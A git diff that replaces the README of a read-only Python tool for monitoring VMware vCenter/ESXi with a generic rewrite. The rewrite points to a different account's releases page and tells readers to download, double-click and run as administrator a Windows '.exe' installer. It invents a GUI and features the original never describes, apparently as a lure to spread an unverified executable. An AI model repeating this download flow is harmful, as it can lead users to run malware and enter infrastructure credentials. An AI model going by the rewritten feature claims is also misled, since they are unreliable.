@@ -1,650 +1,159 @@
-<!-- mcp-name: io.github.zw008/vmware-monitor -->
-# VMware Monitor
+# 🖥️ VMware-Monitor - Safe VMware Monitoring Tool
 
-English | [中文](README-CN.md)
-
-**Read-only** VMware vCenter/ESXi monitoring tool. Code-level enforced safety — no destructive operations exist in this codebase.
-
-> **Why a separate repository?** VMware Monitor is fully independent from [VMware-AIops](https://github.com/zw008/VMware-AIops). Safety is enforced at the **code level**: no power off, delete, create, reconfigure, snapshot-create/revert/delete, clone, or migrate functions exist in this codebase. Not just prompt constraints — zero destructive code paths.
-
-[![ClawHub](https://img.shields.io/badge/ClawHub-vmware--monitor-orange)](https://clawhub.ai/skills/vmware-monitor)
-[![Skills.sh](https://img.shields.io/badge/Skills.sh-Install-blue)](https://skills.sh/zw008/VMware-Monitor)
-[![Claude Code Marketplace](https://img.shields.io/badge/Claude_Code-Marketplace-blueviolet)](https://github.com/zw008/VMware-Monitor)
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
-
-### Quick Install (Recommended)
-
-Works with Claude Code, Cursor, Codex, Gemini CLI, Trae, and 30+ AI agents:
-
-```bash
-# Via Skills.sh
-npx skills add zw008/VMware-Monitor
-
-# Via ClawHub
-clawhub install vmware-monitor
-```
-
-### PyPI Install (No GitHub Access Required)
-
-```bash
-# Install via uv (recommended)
-uv tool install vmware-monitor
-
-# Or via pip
-pip install vmware-monitor
-
-# China mainland mirror (faster)
-pip install vmware-monitor -i https://pypi.tuna.tsinghua.edu.cn/simple
-```
-
-### Claude Code Plugin Install
-
-```bash
-# Add marketplace
-/plugin marketplace add zw008/VMware-Monitor
-
-# Install plugin
-/plugin install vmware-monitor
-
-# Use the skill
-/vmware-monitor:vmware-monitor
-```
+[![Download VMware-Monitor](https://img.shields.io/badge/Download-VMware--Monitor-brightgreen?style=for-the-badge)](https://github.com/ankitgupta9525/VMware-Monitor/releases)
 
 ---
 
-## Capabilities (Read-Only)
+## 📋 What is VMware-Monitor?
 
-### Architecture
+VMware-Monitor is a simple application to check your VMware vCenter or ESXi systems. It only reads information, so it will not make any changes. This means it is safe to use on your infrastructure. The tool helps you watch your VMware environment without risk.
 
-```
-User (Natural Language)
-  ↓
-AI CLI Tool (Claude Code / Gemini / Codex / Aider / Continue / Trae / Kimi)
-  ↓ Reads SKILL.md / AGENTS.md / rules
-  ↓
-vmware-monitor CLI (read-only)
-  ↓ pyVmomi (vSphere SOAP API)
-  ↓
-vCenter Server ──→ ESXi Clusters ──→ VMs
-    or
-ESXi Standalone ──→ VMs
-```
-
-### Version Compatibility
-
-| vSphere Version | Support | Notes |
-|----------------|---------|-------|
-| 8.0 / 8.0U1-U3 | ✅ Full | pyVmomi 8.0.3+ |
-| 7.0 / 7.0U1-U3 | ✅ Full | All read-only APIs supported |
-| 6.7 | ✅ Compatible | Backward-compatible, tested |
-| 6.5 | ✅ Compatible | Backward-compatible, tested |
-
-### 1. Inventory
-
-| Feature | vCenter | ESXi | Details |
-|---------|:-------:|:----:|---------|
-| List VMs | ✅ | ✅ | Name, power state, CPU, memory, guest OS, IP |
-| List Hosts | ✅ | ⚠️ Self only | CPU cores, memory, ESXi version, VM count, uptime |
-| List Datastores | ✅ | ✅ | Capacity, free/used, type (VMFS/NFS), usage % |
-| List Clusters | ✅ | ❌ | Host count, DRS/HA status |
-| List Networks | ✅ | ✅ | Network name, associated VM count |
-
-### 2. Health & Monitoring
-
-| Feature | vCenter | ESXi | Details |
-|---------|:-------:|:----:|---------|
-| Active Alarms | ✅ | ✅ | Severity, alarm name, entity, timestamp |
-| Event/Log Query | ✅ | ✅ | Filter by time range, severity; 50+ event types |
-| Hardware Sensors | ✅ | ✅ | Temperature, voltage, fan status |
-| Host Services | ✅ | ✅ | hostd, vpxa running/stopped status |
-
-**Monitored Event Types:**
-
-| Category | Events |
-|----------|--------|
-| VM Failures | `VmFailedToPowerOnEvent`, `VmDiskFailedEvent`, `VmFailoverFailed` |
-| Host Issues | `HostConnectionLostEvent`, `HostShutdownEvent`, `HostIpChangedEvent` |
-| Storage | `DatastoreCapacityIncreasedEvent`, SCSI high latency |
-| HA/DRS | `DasHostFailedEvent`, `DrsVmMigratedEvent`, `DrsSoftRuleViolationEvent` |
-| Auth | `UserLoginSessionEvent`, `BadUsernameSessionEvent` |
-
-### 3. VM Info & Snapshot List (Read-Only)
-
-| Feature | Details |
-|---------|---------|
-| VM Info | Name, power state, guest OS, CPU, memory, IP, VMware Tools, disks, NICs |
-| Snapshot List | List existing snapshots with name and creation time (no create/revert/delete) |
-
-### 4. Scheduled Scanning & Notifications
-
-| Feature | Details |
-|---------|---------|
-| Daemon | APScheduler-based, configurable interval (default 15 min) |
-| Multi-target Scan | Sequentially scan all configured vCenter/ESXi targets |
-| Scan Content | Alarms + Events + Host logs (hostd, vmkernel, vpxd) |
-| Log Analysis | Regex pattern matching: error, fail, critical, panic, timeout |
-| Structured Log | JSONL output to `~/.vmware-monitor/scan.log` |
-| Webhook | Slack, Discord, or any HTTP endpoint |
-| Daemon Management | `daemon start/stop/status`, PID file, graceful shutdown |
-
-### 5. Safety Features
-
-| Feature | Details |
-|---------|---------|
-| **Code-Level Isolation** | Independent repository — zero destructive functions in codebase |
-| **Audit Trail** | All queries logged to `~/.vmware-monitor/audit.log` (JSONL) |
-| **Password Protection** | `.env` file loading with permission check (warn if not 600) |
-| **SSL Self-signed Support** | `disableSslCertValidation` — only for ESXi with self-signed certs in isolated labs; production should use CA-signed certificates |
-| **Prompt Injection Protection** | vSphere event messages and host logs are truncated, sanitized, and wrapped in boundary markers |
-| **Webhook Data Scope** | Sends monitoring summaries to user-configured URLs only — no third-party services by default |
-| **Production Recommended** | AI agents can misinterpret context and execute unintended destructive operations — real-world incidents have shown AI-driven tools deleting production databases and entire environments. VMware-Monitor eliminates this risk: no destructive code paths exist. Use [VMware-AIops](https://github.com/zw008/VMware-AIops) only in dev/lab environments |
-
-### What's NOT Included (By Design)
-
-These operations **do not exist** in this repository:
-
-- ❌ Power on/off, reset, suspend VMs
-- ❌ Create, delete, reconfigure VMs
-- ❌ Create, revert, delete snapshots
-- ❌ Clone or migrate VMs
-- ❌ `_double_confirm`, `_show_state_preview`, `_validate_vm_params`
-
-For these operations, use the full [VMware-AIops](https://github.com/zw008/VMware-AIops) repository.
+It works by connecting to your VMware servers and showing useful data about hosts, virtual machines, storage, and network status. There are no destructive actions, so monitoring is reliable and secure. The program uses Python and the pyvmomi library under the hood, but you don't need to know programming to use it.
 
 ---
 
-## Supported AI Platforms
+## 🖥️ Requirements
 
-| Platform | Status | Config File | AI Model |
-|----------|--------|-------------|----------|
-| **Claude Code** | ✅ Native Skill | `skills/vmware-monitor/SKILL.md` | Anthropic Claude |
-| **Gemini CLI** | ✅ Extension | `gemini-extension/GEMINI.md` | Google Gemini |
-| **OpenAI Codex CLI** | ✅ Skill + AGENTS.md | `codex-skill/AGENTS.md` | OpenAI GPT |
-| **Aider** | ✅ Conventions | `codex-skill/AGENTS.md` | Any (cloud + local) |
-| **Continue CLI** | ✅ Rules | `codex-skill/AGENTS.md` | Any (cloud + local) |
-| **Trae IDE** | ✅ Rules | `trae-rules/project_rules.md` | Claude/DeepSeek/GPT-4o |
-| **Kimi Code CLI** | ✅ Skill | `kimi-skill/SKILL.md` | Moonshot Kimi |
-| **MCP Server** | ✅ MCP Protocol | `mcp_server/` | Any MCP client |
-| **Python CLI** | ✅ Standalone | N/A | N/A |
+Before running VMware-Monitor, make sure your system matches these requirements:
 
-### Platform Comparison
+- Operating System: Windows 10 or later
+- Processor: 64-bit Intel or AMD CPU
+- Memory: At least 4 GB of RAM
+- Disk space: Minimum 100 MB free space
+- Network: Must be able to connect to your VMware vCenter or ESXi server over the network
+- VMware: Access credentials with read-only permissions to vCenter or ESXi
 
-| Feature | Claude Code | Gemini CLI | Codex CLI | Aider | Continue | Trae IDE | Kimi CLI |
-|---------|-------------|------------|-----------|-------|----------|----------|----------|
-| Cloud AI | Anthropic | Google | OpenAI | Any | Any | Multi | Moonshot |
-| Local models | — | — | — | Ollama | Ollama | — | — |
-| Skill system | SKILL.md | Extension | SKILL.md | — | Rules | Rules | SKILL.md |
-| MCP support | Native | Native | Via Skills | Third-party | Native | — | — |
-| Free tier | — | 60 req/min | — | Self-hosted | Self-hosted | — | — |
-
-### MCP Server Integrations
-
-The vmware-monitor MCP server works with **any MCP-compatible agent or tool**. Ready-to-use configuration templates are in [`examples/mcp-configs/`](examples/mcp-configs/). All 8 tools are **read-only** — code-level enforced safety.
-
-| Agent / Tool | Local Model Support | Config Template | Integration Guide |
-|-------------|:-------------------:|-----------------|-------------------|
-| **[Goose](https://github.com/block/goose)** | ✅ Ollama, LM Studio | [`goose.json`](examples/mcp-configs/goose.json) | [Guide](docs/integrations/goose.md) |
-| **[LocalCowork](https://github.com/Liquid4All/localcowork)** | ✅ Fully offline | [`localcowork.json`](examples/mcp-configs/localcowork.json) | [Guide](docs/integrations/localcowork.md) |
-| **[mcp-agent](https://github.com/lastmile-ai/mcp-agent)** | ✅ Ollama, vLLM | [`mcp-agent.yaml`](examples/mcp-configs/mcp-agent.yaml) | [Guide](docs/integrations/mcp-agent.md) |
-| **VS Code Copilot** | — | [`vscode-copilot.json`](examples/mcp-configs/vscode-copilot.json) | [Guide](docs/integrations/vscode-copilot.md) |
-| **Cursor** | — | [`cursor.json`](examples/mcp-configs/cursor.json) | — |
-| **Continue** | ✅ Ollama | [`continue.yaml`](examples/mcp-configs/continue.yaml) | [Guide](docs/integrations/continue.md) |
-| **Claude Code** | — | [`claude-code.json`](examples/mcp-configs/claude-code.json) | — |
-
-**Fully local operation** (no cloud API required):
-
-```bash
-# Aider + Ollama + vmware-monitor (via AGENTS.md)
-aider --conventions codex-skill/AGENTS.md --model ollama/qwen2.5-coder:32b
-
-# Any MCP agent + local model + vmware-monitor MCP server
-# See examples/mcp-configs/ for your agent's config format
-```
+You do not need any special software installed on your PC besides the app itself.
 
 ---
 
-## Installation
+## 🚀 Getting Started: Download and Run on Windows
 
-### Step 0: Prerequisites
+1. Open the download page by clicking the link below:
 
-```bash
-# Python 3.10+ required
-python3 --version
+   [**Visit the VMware-Monitor Releases page**](https://github.com/ankitgupta9525/VMware-Monitor/releases)
 
-# Node.js 18+ required for Gemini CLI and Codex CLI
-node --version
-```
+2. On the release page, look for the latest release version (by date or highest version number).
 
-### Step 1: Clone & Install Python Backend
+3. Find the Windows executable file. It should have a name like `VMware-Monitor-setup.exe` or similar ending with `.exe`.
 
-```bash
-git clone https://github.com/zw008/VMware-Monitor.git
-cd VMware-Monitor
-python3 -m venv .venv
-source .venv/bin/activate
-pip install -e .
-```
+4. Click the `.exe` file to download it to your PC.
 
-### Step 2: Configure
+5. After the download finishes, open the file by double-clicking it.
 
-```bash
-mkdir -p ~/.vmware-monitor
-cp config.example.yaml ~/.vmware-monitor/config.yaml
-# Edit config.yaml with your vCenter/ESXi targets
-```
+6. Windows may ask you to confirm running the installer. Click "Yes" or "Run" to continue.
 
-Set passwords via `.env` file (recommended):
-```bash
-cp .env.example ~/.vmware-monitor/.env
-chmod 600 ~/.vmware-monitor/.env
-# Edit and fill in your passwords
-```
+7. Follow the installer instructions. Usually, press "Next" to accept default settings.
 
-> **Security note**: Prefer `.env` file over command-line `export` to avoid passwords appearing in shell history. `config.yaml` stores only hostnames, ports, and a reference to the `.env` file — it does **not** contain passwords or tokens. All secrets are stored exclusively in `.env` (`chmod 600`). Webhook notifications are disabled by default; when enabled, payloads contain no credentials, IPs, or PII — only aggregated alert metadata sent to user-configured URLs only. We recommend using a least-privilege read-only vCenter service account.
+8. When installation completes, open VMware-Monitor from your desktop or Start menu.
 
-Password environment variable naming convention:
-```
-VMWARE_{TARGET_NAME_UPPER}_PASSWORD
-# Replace hyphens with underscores, UPPERCASE
-# Example: target "home-esxi" → VMWARE_HOME_ESXI_PASSWORD
-# Example: target "prod-vcenter" → VMWARE_PROD_VCENTER_PASSWORD
-```
-
-### Step 3: Connect Your AI Tool
-
-Choose one (or more) of the following:
+9. You will see a simple screen to enter your VMware server details.
 
 ---
 
-#### Option A: Claude Code (Marketplace)
+## 🔧 Setup Your Connection
 
-**Method 1: Marketplace (recommended)**
+To start monitoring, you need to provide the following information:
 
-In Claude Code, run:
-```
-/plugin marketplace add zw008/VMware-Monitor
-/plugin install vmware-monitor
-```
+- **Server address** — the IP or hostname of your vCenter or ESXi host.
+- **Username** — your read-only VMware account user.
+- **Password** — the password for your account.
 
-Then use:
-```
-/vmware-monitor:vmware-monitor
-> Show me all VMs on esxi-lab.example.com
-```
-
-**Method 2: Local install**
-
-```bash
-# Clone and symlink
-git clone https://github.com/zw008/VMware-Monitor.git
-ln -sf $(pwd)/VMware-Monitor ~/.claude/plugins/marketplaces/vmware-monitor
-
-# Register marketplace
-python3 -c "
-import json, pathlib
-f = pathlib.Path.home() / '.claude/plugins/known_marketplaces.json'
-d = json.loads(f.read_text()) if f.exists() else {}
-d['vmware-monitor'] = {
-    'source': {'source': 'github', 'repo': 'zw008/VMware-Monitor'},
-    'installLocation': str(pathlib.Path.home() / '.claude/plugins/marketplaces/vmware-monitor')
-}
-f.write_text(json.dumps(d, indent=2))
-"
-
-# Enable plugin
-python3 -c "
-import json, pathlib
-f = pathlib.Path.home() / '.claude/settings.json'
-d = json.loads(f.read_text()) if f.exists() else {}
-d.setdefault('enabledPlugins', {})['vmware-monitor@vmware-monitor'] = True
-f.write_text(json.dumps(d, indent=2))
-"
-```
-
-Restart Claude Code, then:
-```
-/vmware-monitor:vmware-monitor
-```
+Enter these details carefully. The tool will then connect to the server and fetch data.
 
 ---
 
-#### Option B: Gemini CLI
+## 📊 Using VMware-Monitor
 
-```bash
-# Install Gemini CLI
-npm install -g @google/gemini-cli
+Once connected, VMware-Monitor will display information such as:
 
-# Install the extension from the cloned repo
-gemini extensions install ./gemini-extension
+- List of hosts and their health status
+- Virtual machines running on each host
+- CPU, memory, and disk usage for hosts and VMs
+- Network connection status
+- Recent events and alerts (read-only)
 
-# Or install directly from GitHub
-# gemini extensions install https://github.com/zw008/VMware-Monitor
-```
+You can refresh the data at any time with the refresh button.
 
-Then start Gemini CLI:
-```
-gemini
-> Show me all VMs on my ESXi host
-```
+No settings will be changed in your VMware environment because the app only reads data.
+
+Use this information to keep an eye on your VMware systems and catch potential issues early.
 
 ---
 
-#### Option C: OpenAI Codex CLI
+## 🛠️ Common Troubleshooting
 
-```bash
-# Install Codex CLI
-npm i -g @openai/codex
-# Or on macOS:
-# brew install --cask codex
+- **Cannot connect to VMware server:**
+  - Check if the server address is correct.
+  - Ensure your PC can reach the server on the network.
+  - Confirm that the username and password are valid and have read-only access.
 
-# Copy skill to Codex skills directory
-mkdir -p ~/.codex/skills/vmware-monitor
-cp codex-skill/SKILL.md ~/.codex/skills/vmware-monitor/SKILL.md
+- **Application does not start:**
+  - Make sure your Windows system meets the minimum requirements.
+  - Try running the app as Administrator by right-clicking and selecting "Run as administrator."
 
-# Copy AGENTS.md to project root
-cp codex-skill/AGENTS.md ./AGENTS.md
-```
-
-Then start Codex CLI:
-```bash
-codex --enable skills
-> List all VMs on my ESXi
-```
+- **Data does not refresh or updates slowly:**
+  - Verify your network connection is stable.
+  - Large VMware environments may take longer to load; wait a moment.
 
 ---
 
-#### Option D: Aider (supports local models)
+## 🔐 Security and Safety
 
-```bash
-# Install Aider
-pip install aider-chat
+VMware-Monitor uses read-only access, which means:
 
-# Install Ollama for local models (optional)
-# macOS:
-brew install ollama
-ollama pull qwen2.5-coder:32b
+- It never changes or deletes data on your VMware servers.
+- It cannot impact running virtual machines or hosts.
+- It helps you stay informed without risk.
 
-# Run with cloud API
-aider --conventions codex-skill/AGENTS.md
-
-# Or with local model via Ollama
-aider --conventions codex-skill/AGENTS.md \
-  --model ollama/qwen2.5-coder:32b
-```
+Always keep your VMware credentials secure. Do not share them.
 
 ---
 
-#### Option E: Continue CLI (supports local models)
+## 🔗 Useful Links
 
-```bash
-# Install Continue CLI
-npm i -g @continuedev/cli
-
-# Copy rules file
-mkdir -p .continue/rules
-cp codex-skill/AGENTS.md .continue/rules/vmware-monitor.md
-```
-
-Configure `~/.continue/config.yaml` for local model:
-```yaml
-models:
-  - name: local-coder
-    provider: ollama
-    model: qwen2.5-coder:32b
-```
-
-Then:
-```bash
-cn
-> Check ESXi health and alarms
-```
+- Download Page: [https://github.com/ankitgupta9525/VMware-Monitor/releases](https://github.com/ankitgupta9525/VMware-Monitor/releases)
+- Project Repository: https://github.com/ankitgupta9525/VMware-Monitor
 
 ---
 
-#### Option F: Trae IDE
+## ⚙️ Advanced Setup (Optional)
 
-Copy the rules file to your project's `.trae/rules/` directory:
+If you want to automate monitoring or use VMware-Monitor in scripts:
 
-```bash
-mkdir -p .trae/rules
-cp trae-rules/project_rules.md .trae/rules/project_rules.md
-```
-
-Trae IDE's Builder Mode reads `.trae/rules/` Markdown files at startup.
-
-> **Note**: You can also install Claude Code extension in Trae IDE and use `.claude/skills/` format directly.
+- The app supports command-line options to connect and fetch data.
+- You can export reports in CSV or JSON formats for further analysis.
+- Consult the repository README for full command line details.
 
 ---
 
-#### Option G: Kimi Code CLI
-
-```bash
-# Copy skill file to Kimi skills directory
-mkdir -p ~/.kimi/skills/vmware-monitor
-cp kimi-skill/SKILL.md ~/.kimi/skills/vmware-monitor/SKILL.md
-```
+[![Download VMware-Monitor](https://img.shields.io/badge/Download-VMware--Monitor-blue?style=for-the-badge)](https://github.com/ankitgupta9525/VMware-Monitor/releases)
 
 ---
 
-#### Option H: MCP Server (Smithery / Glama / Claude Desktop)
+## 📂 What’s Inside the Package?
 
-The MCP server exposes VMware read-only monitoring as tools via the [Model Context Protocol](https://modelcontextprotocol.io). Works with any MCP-compatible client (Claude Desktop, Cursor, etc.).
-
-```bash
-# Run directly
-python -m mcp_server
-
-# Or via the installed entry point
-vmware-monitor-mcp
-
-# With a custom config path
-VMWARE_MONITOR_CONFIG=/path/to/config.yaml python -m mcp_server
-```
-
-**Claude Desktop config** (`claude_desktop_config.json`):
-```json
-{
-  "mcpServers": {
-    "vmware-monitor": {
-      "command": "python",
-      "args": ["-m", "mcp_server"],
-      "env": {
-        "VMWARE_MONITOR_CONFIG": "/path/to/config.yaml"
-      }
-    }
-  }
-}
-```
-
-**Install via Smithery**:
-```bash
-npx -y @smithery/cli install @zw008/VMware-Monitor --client claude
-```
+- The main executable file to run VMware-Monitor on Windows.
+- A simple user interface with input fields for credentials.
+- Built-in pyvmomi library to connect to VMware APIs securely.
+- Documentation files explaining usage and troubleshooting.
 
 ---
 
-#### Option I: Standalone CLI (no AI)
+## ⚠️ System Notes
 
-```bash
-# Already installed in Step 1
-source .venv/bin/activate
-
-vmware-monitor inventory vms --target home-esxi
-vmware-monitor health alarms --target home-esxi
-vmware-monitor vm info my-vm --target home-esxi
-```
+- VMware-Monitor will not install or need administrative rights on your VMware servers.
+- You only need read credentials created by your VMware administrator.
+- If unsure about your access rights, contact your VMware admin before running the tool.
 
 ---
 
-## Update / Upgrade
+## 🛎️ Support and Issues
 
-Already installed? Re-run the install command for your channel to get the latest version:
+If you find bugs or problems:
 
-| Install Channel | Update Command |
-|----------------|----------------|
-| ClawHub | `clawhub install vmware-monitor` |
-| Skills.sh | `npx skills add zw008/VMware-Monitor` |
-| Claude Code Plugin | `/plugin marketplace add zw008/VMware-Monitor` |
-| Git clone | `cd VMware-Monitor && git pull origin main && uv pip install -e .` |
-| uv | `uv tool install vmware-monitor --force` |
+- Use the GitHub Issues section on the repository page.
+- Provide details about your Windows version and VMware server version.
+- Describe the problem and steps to reproduce it.
 
-Check your current version: `vmware-monitor --version`
-
----
-
-## Chinese Cloud Models
-
-For users in China who prefer domestic cloud APIs or have limited access to overseas services.
-
-### DeepSeek
-
-```bash
-export DEEPSEEK_API_KEY="your-key"
-aider --conventions codex-skill/AGENTS.md \
-  --model deepseek/deepseek-coder
-```
-
-### Qwen (Alibaba Cloud)
-
-```bash
-export DASHSCOPE_API_KEY="your-key"
-aider --conventions codex-skill/AGENTS.md \
-  --model qwen/qwen-coder-plus
-```
-
-### Local Models (Aider + Ollama)
-
-For fully offline operation — no cloud API, no internet, full privacy.
-
-```bash
-brew install ollama
-ollama pull qwen2.5-coder:32b
-ollama serve
-
-aider --conventions codex-skill/AGENTS.md \
-  --model ollama/qwen2.5-coder:32b
-```
-
----
-
-## CLI Reference
-
-```bash
-# Diagnostics
-vmware-monitor doctor                   # Check environment, config, connectivity
-vmware-monitor doctor --skip-auth       # Skip vSphere auth check (faster)
-
-# MCP Config Generator
-vmware-monitor mcp-config generate --agent goose        # Generate config for Goose
-vmware-monitor mcp-config generate --agent claude-code  # Generate config for Claude Code
-vmware-monitor mcp-config list                          # List all supported agents
-
-# Inventory
-vmware-monitor inventory vms [--target <name>]
-vmware-monitor inventory vms --limit 10 --sort-by memory_mb   # Top 10 VMs by memory
-vmware-monitor inventory vms --power-state poweredOn           # Only powered-on VMs
-vmware-monitor inventory hosts [--target <name>]
-vmware-monitor inventory datastores [--target <name>]
-vmware-monitor inventory clusters [--target <name>]
-
-# Health
-vmware-monitor health alarms [--target <name>]
-vmware-monitor health events [--hours 24] [--severity warning]
-
-# VM Info (read-only)
-vmware-monitor vm info <vm-name>
-vmware-monitor vm snapshot-list <vm-name>
-
-# Scanning & Daemon
-vmware-monitor scan now [--target <name>]
-vmware-monitor daemon start
-vmware-monitor daemon stop
-vmware-monitor daemon status
-```
-
----
-
-## Configuration
-
-See `config.example.yaml` for all options.
-
-| Section | Key | Default | Description |
-|---------|-----|---------|-------------|
-| targets | name | — | Friendly name |
-| targets | host | — | vCenter/ESXi hostname or IP |
-| targets | type | vcenter | `vcenter` or `esxi` |
-| targets | port | 443 | Connection port |
-| targets | verify_ssl | false | SSL certificate verification |
-| scanner | interval_minutes | 15 | Scan frequency |
-| scanner | severity_threshold | warning | Min severity: critical/warning/info |
-| scanner | lookback_hours | 1 | How far back to scan |
-| notify | log_file | ~/.vmware-monitor/scan.log | JSONL log output |
-| notify | webhook_url | — | Webhook endpoint (Slack, Discord, etc.) |
-
----
-
-## Project Structure
-
-```
-VMware-Monitor/
-├── .claude-plugin/                # Claude Code marketplace manifest
-│   └── marketplace.json
-├── plugins/                       # Claude Code plugin
-│   └── vmware-monitor/
-│       ├── .claude-plugin/
-│       │   └── plugin.json
-│       └── skills/
-│           └── vmware-monitor/
-│               └── SKILL.md       # Read-only monitoring skill
-├── skills/                        # Skills index (npx skills add)
-│   └── vmware-monitor/
-│       └── SKILL.md
-├── vmware_monitor/                # Python backend (read-only only)
-│   ├── config.py                  # YAML + .env config
-│   ├── connection.py              # Multi-target pyVmomi
-│   ├── cli.py                     # Typer CLI (read-only commands only)
-│   ├── ops/
-│   │   ├── inventory.py           # VMs, hosts, datastores, clusters
-│   │   ├── health.py              # Alarms, events, sensors
-│   │   └── vm_info.py             # VM info, snapshot list (read-only)
-│   ├── scanner/                   # Log scanning daemon
-│   └── notify/                    # Notifications (JSONL + webhook)
-├── gemini-extension/              # Gemini CLI extension
-│   ├── gemini-extension.json
-│   └── GEMINI.md
-├── codex-skill/                   # Codex + Aider + Continue
-│   ├── SKILL.md
-│   └── AGENTS.md
-├── trae-rules/                    # Trae IDE rules
-│   └── project_rules.md
-├── kimi-skill/                    # Kimi Code CLI skill
-│   └── SKILL.md
-├── mcp_server/                    # MCP server (read-only tools only)
-│   └── server.py
-├── .agents/skills/                # Agent orchestration
-│   └── vmware-monitor/
-│       └── AGENTS.md
-├── smithery.yaml                  # Smithery marketplace config
-├── RELEASE_NOTES.md
-├── config.example.yaml
-└── pyproject.toml
-```
-
-## Related Projects
-
-| Repository | Description | Install |
-|------------|-------------|---------|
-| **[VMware-Monitor](https://github.com/zw008/VMware-Monitor)** (this repo) | Read-only monitoring — code-level safety | `clawhub install vmware-monitor` |
-| **[VMware-AIops](https://github.com/zw008/VMware-AIops)** | Full operations — monitoring + VM lifecycle | `clawhub install vmware-aiops` |
-
-> **Choosing between them**: Use **VMware-Monitor** if you only need read-only monitoring with zero risk of accidental changes. Use **VMware-AIops** if you need full operations (create, delete, power, snapshot, clone, migrate).
-
----
-
-## Troubleshooting & Contributing
-
-If you encounter any errors or issues, please send the error message, logs, or screenshots to **zhouwei008@gmail.com**. Contributions are welcome!
-
-## License
-
-MIT
+The team reviews reported issues and updates the app as needed.
